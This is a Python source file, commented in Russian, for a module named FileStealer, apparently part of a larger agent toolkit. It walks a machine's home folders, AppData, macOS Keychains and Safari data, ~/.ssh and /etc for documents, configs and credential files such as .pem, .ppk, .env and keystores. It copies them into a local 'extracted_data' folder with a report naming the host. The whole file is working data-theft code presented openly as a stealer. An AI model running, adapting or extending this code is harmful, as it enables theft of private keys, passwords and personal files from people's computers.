#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FileStealer Module - Находит и экстрактит интересные файлы из системы
"""

import os
import re
import json
import shutil
import platform
import logging
import traceback
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Set

logger = logging.getLogger("FileStealer")

class FileStealer:
    """
    Модуль для поиска и экстракции ценных файлов из системы
    """
    
    def __init__(self, output_dir=None):
        self.output_dir = output_dir or os.path.join(os.getcwd(), "extracted_data/files")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Используем EnvironmentManager для получения системной информации
        try:
            from agent_modules.environment_manager import EnvironmentManager
            self.env_manager = EnvironmentManager()
            self.sys_info = self.env_manager.collect_system_info()
            self.has_env_manager = True
        except ImportError:
            self.env_manager = None
            self.sys_info = {"os": "unknown", "hostname": "unknown"}
            self.has_env_manager = False
            
        # Интересные типы файлов для поиска
        self.target_extensions = {
            "documents": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".txt", ".rtf", ".odt"],
            "images": [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff"],
            "configurations": [".conf", ".config", ".ini", ".json", ".yaml", ".yml"],
            "source_code": [".py", ".js", ".html", ".css", ".c", ".cpp", ".java", ".php", ".go"],
            "credentials": [".key", ".pem", ".ppk", ".pub", ".keystore", ".jks", ".env", ".secret"]
        }
        
        # Важные локации для поиска в зависимости от ОС
        self.target_locations = self._get_target_locations()
        
    def _get_target_locations(self) -> Dict[str, List[str]]:
        """
        Определяет целевые локации для поиска в зависимости от ОС
        
        Returns:
            Dict с путями для поиска по категориям
        """
        os_type = self.sys_info.get("os", "").lower()
        home_dir = os.path.expanduser("~")
        
        # Общие для всех ОС пути
        locations = {
            "home_config": [os.path.join(home_dir, ".config")],
            "documents": [os.path.join(home_dir, "Documents")],
            "desktop": [os.path.join(home_dir, "Desktop")]
        }
        
        # Специфичные для Windows пути
        if "win" in os_type:
            locations.update({
                "appdata": [os.path.join(home_dir, "AppData", "Roaming"),
                           os.path.join(home_dir, "AppData", "Local")],
                "documents_win": [os.path.join(home_dir, "Documents"),
                                 os.path.join(home_dir, "Downloads"),
                                 os.path.join(home_dir, "OneDrive", "Documents")]
            })
        # Специфичные для macOS пути
        elif "darwin" in os_type:
            locations.update({
                "keychains": [os.path.join(home_dir, "Library", "Keychains")],
                "application_support": [os.path.join(home_dir, "Library", "Application Support")],
                "safari_data": [os.path.join(home_dir, "Library", "Safari")]
            })
        # Специфичные для Linux пути
        elif "linux" in os_type:
            locations.update({
                "config_dirs": [os.path.join(home_dir, ".config"),
                               os.path.join(home_dir, ".local", "share"),
                               "/etc"],
                "ssh_keys": [os.path.join(home_dir, ".ssh")]
            })
            
        return locations
        
    def find_target_files(self, max_files_per_category: int = 20, max_size_mb: int = 5) -> Dict[str, List[Dict[str, Any]]]:
        """
        Поиск файлов по заданным критериям
        
        Args:
            max_files_per_category: Максимальное количество файлов в каждой категории
            max_size_mb: Максимальный размер файла в МБ
            
        Returns:
            Dict с найденными файлами по категориям
        """
        logger.info("Начинаю поиск целевых файлов...")
        
        found_files = {category: [] for category in self.target_extensions}
        max_size_bytes = max_size_mb * 1024 * 1024
        
        # Для каждой локации ищем подходящие файлы
        for location_category, paths in self.target_locations.items():
            for base_path in paths:
                if not os.path.exists(base_path) or not os.path.isdir(base_path):
                    continue
                    
                logger.info(f"Сканирую директорию: {base_path}")
                
                try:
                    # Используем FileManager для поиска файлов если можем
                    if self.has_env_manager:
                        self._search_using_file_manager(base_path, found_files, max_size_bytes)
                    else:
                        self._search_directories(base_path, found_files, max_size_bytes)
                except Exception as e:
                    logger.error(f"Ошибка при сканировании {base_path}: {str(e)}")
                    
        # Ограничиваем количество файлов в каждой категории
        for category in found_files:
            # Сортируем по времени изменения (новые в начале)
            found_files[category].sort(key=lambda x: x.get("modified", 0), reverse=True)
            
            # Ограничиваем количество
            if len(found_files[category]) > max_files_per_category:
                found_files[category] = found_files[category][:max_files_per_category]
        
        return found_files
    
    def _search_using_file_manager(self, base_path: str, found_files: Dict[str, List[Dict[str, Any]]], max_size_bytes: int):
        """
        Поиск файлов с использованием FileManager
        
        Args:
            base_path: Базовая директория для поиска
            found_files: Словарь для сохранения найденных файлов
            max_size_bytes: Максимальный размер файла в байтах
        """
        try:
            from agent_modules.file_manager import FileManager
            file_manager = FileManager(base_dir=base_path)
            
            # Рекурсивный поиск по директориям
            self._recursive_search_with_manager(file_manager, base_path, found_files, max_size_bytes)
            
        except ImportError:
            logger.warning("FileManager не найден, использую встроенные методы")
            self._search_directories(base_path, found_files, max_size_bytes)
    
    def _recursive_search_with_manager(self, file_manager, current_path: str, found_files: Dict[str, List[Dict[str, Any]]], max_size_bytes: int, depth: int = 0):
        """
        Рекурсивный поиск файлов с использованием FileManager
        
        Args:
            file_manager: Экземпляр FileManager
            current_path: Текущая директория для поиска
            found_files: Словарь для сохранения найденных файлов
            max_size_bytes: Максимальный размер файла в байтах
            depth: Текущая глубина рекурсии
        """
        # Ограничиваем глубину рекурсии
        if depth > 5:
            return
            
        # Получаем список файлов в текущей директории
        result = file_manager.list_directory(current_path)
        
        if result.get("status") != "success":
            return
            
        for item in result.get("items", []):
            if item.get("type") == "directory":
                # Рекурсивно просматриваем поддиректории
                self._recursive_search_with_manager(
                    file_manager, 
                    item.get("path"), 
                    found_files, 
                    max_size_bytes,
                    depth + 1
                )
            else:
                # Проверяем файл на соответствие критериям
                file_path = item.get("path")
                file_size = item.get("size", 0)
                file_ext = os.path.splitext(file_path)[1].lower()
                
                # Пропускаем слишком большие файлы
                if file_size > max_size_bytes:
                    continue
                    
                # Проверяем расширение файла
                for category, extensions in self.target_extensions.items():
                    if file_ext in extensions:
                        found_files[category].append({
                            "name": item.get("name"),
                            "path": file_path,
                            "size": file_size,
                            "modified": item.get("modified")
                        })
                        break
    
    def _search_directories(self, base_path: str, found_files: Dict[str, List[Dict[str, Any]]], max_size_bytes: int, depth: int = 0):
        """
        Поиск файлов с использованием встроенных методов Python
        
        Args:
            base_path: Базовая директория для поиска
            found_files: Словарь для сохранения найденных файлов
            max_size_bytes: Максимальный размер файла в байтах
            depth: Текущая глубина рекурсии
        """
        # Ограничиваем глубину рекурсии
        if depth > 5:
            return
            
        try:
            for entry in os.scandir(base_path):
                try:
                    # Пропускаем символические ссылки
                    if entry.is_symlink():
                        continue
                        
                    if entry.is_dir():
                        # Рекурсивно просматриваем поддиректории
                        self._search_directories(
                            entry.path, 
                            found_files, 
                            max_size_bytes,
                            depth + 1
                        )
                    else:
                        # Проверяем файл на соответствие критериям
                        file_stat = entry.stat()
                        file_size = file_stat.st_size
                        file_ext = os.path.splitext(entry.path)[1].lower()
                        
                        # Пропускаем слишком большие файлы
                        if file_size > max_size_bytes:
                            continue
                            
                        # Проверяем расширение файла
                        for category, extensions in self.target_extensions.items():
                            if file_ext in extensions:
                                found_files[category].append({
                                    "name": entry.name,
                                    "path": entry.path,
                                    "size": file_size,
                                    "modified": datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                                })
                                break
                except PermissionError:
                    continue
                except Exception as e:
                    logger.debug(f"Ошибка при обработке {entry.path}: {str(e)}")
        except PermissionError:
            pass
        except Exception as e:
            logger.debug(f"Ошибка при сканировании {base_path}: {str(e)}")
    
    def extract_files(self, found_files: Dict[str, List[Dict[str, Any]]], max_files: int = 5) -> List[str]:
        """
        Копирует найденные файлы в output_dir
        
        Args:
            found_files: Словарь с найденными файлами по категориям
            max_files: Максимальное количество файлов для копирования из каждой категории
            
        Returns:
            Список путей к скопированным файлам
        """
        logger.info("Начинаю копирование найденных файлов...")
        
        extracted_files = []
        
        # Для каждой категории создаем поддиректорию
        for category, files in found_files.items():
            category_dir = os.path.join(self.output_dir, category)
            os.makedirs(category_dir, exist_ok=True)
            
            # Ограничиваем количество файлов для копирования
            files_to_copy = files[:min(max_files, len(files))]
            
            for file_info in files_to_copy:
                source_path = file_info.get("path")
                file_name = file_info.get("name")
                
                if not source_path or not os.path.exists(source_path):
                    continue
                    
                try:
                    destination_path = os.path.join(category_dir, file_name)
                    shutil.copy2(source_path, destination_path)
                    
                    logger.info(f"Скопирован файл: {source_path} -> {destination_path}")
                    extracted_files.append(destination_path)
                    
                    # Добавляем информацию о копировании
                    file_info["extracted_to"] = destination_path
                except Exception as e:
                    logger.error(f"Ошибка при копировании {source_path}: {str(e)}")
        
        return extracted_files
        
    def run(self) -> Dict[str, Any]:
        """
        Выполняет поиск и извлечение файлов
        
        Returns:
            Словарь с результатами сканирования
        """
        logger.info("Начинаю поиск и извлечение файлов...")
        
        try:
            # Поиск целевых файлов
            found_files = self.find_target_files()
            
            # Подсчет общего количества найденных файлов
            total_found = sum(len(files) for files in found_files.values())
            logger.info(f"Найдено {total_found} файлов")
            
            # Копирование файлов
            extracted_files = self.extract_files(found_files)
            
            # Сохраняем результаты в JSON
            results_file = os.path.join(self.output_dir, "file_stealer_results.json")
            with open(results_file, 'w') as f:
                json.dump({
                    "timestamp": datetime.now().isoformat(),
                    "system": self.sys_info.get("os", "unknown"),
                    "hostname": self.sys_info.get("hostname", "unknown"),
                    "total_found": total_found,
                    "total_extracted": len(extracted_files),
                    "found_files": found_files
                }, f, indent=2)
            
            return {
                "status": "success",
                "summary": {
                    "total_found": total_found,
                    "total_extracted": len(extracted_files),
                    "categories": {category: len(files) for category, files in found_files.items()},
                    "system": self.sys_info.get("os", "unknown"),
                    "using_environment_manager": self.has_env_manager
                },
                "found_files": found_files,
                "extracted_files": extracted_files,
                "output_file": results_file
            }
        except Exception as e:
            logger.error(f"Ошибка при работе FileStealer: {str(e)}")
            return {
                "status": "error",
                "message": str(e),
                "traceback": traceback.format_exc()
            }

def main():
    """Main function to run the file stealer module"""
    import sys
    
    try:
        output_dir = sys.argv[1] if len(sys.argv) > 1 else None
        stealer = FileStealer(output_dir)
        result = stealer.run()
        
        if result["status"] == "success":
            print(f"\nFile Stealer Results:")
            print(f"System: {result['summary']['system']}")
            print(f"Total files found: {result['summary']['total_found']}")
            print(f"Total files extracted: {result['summary']['total_extracted']}")
            print(f"Categories:")
            for category, count in result['summary']['categories'].items():
                print(f"  - {category}: {count}")
            print(f"Output saved to: {result['output_file']}")
        else:
            print(f"Error: {result.get('message', 'Unknown error')}")
            
    except Exception as e:
        print(f"Error running file stealer: {str(e)}")
        traceback.print_exc()

if __name__ == "__main__":
    main() 